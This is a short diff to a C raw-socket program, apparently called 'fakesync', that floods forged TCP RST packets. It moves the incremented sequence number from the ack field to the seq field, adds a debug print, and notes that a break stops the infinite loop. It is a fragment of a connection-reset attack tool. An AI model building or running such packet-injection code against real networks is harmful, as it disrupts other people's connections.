@@ -152,15 +152,16 @@ int main(int argc, char *argv[])
     // flood RST
     while(1)
     {
-        tcph -> ack_seq = htonl(seq0++); // set seq number
-        cstcph -> ack_seq = htonl(seq0++); // set seq number in the checksum header
+        tcph -> seq = htonl(seq0++); // set seq number
+        cstcph -> seq = htonl(seq0); // set seq number in the checksum header
+        printf("seq: %u", seq0);
         tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len);
         if ((n = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
         {
             perror("fakesync: sendto()");
         }
 
-        printf("rst sent");
+        printf("reset sent\n");
         break; // remove to kick out inf loop
     }
 
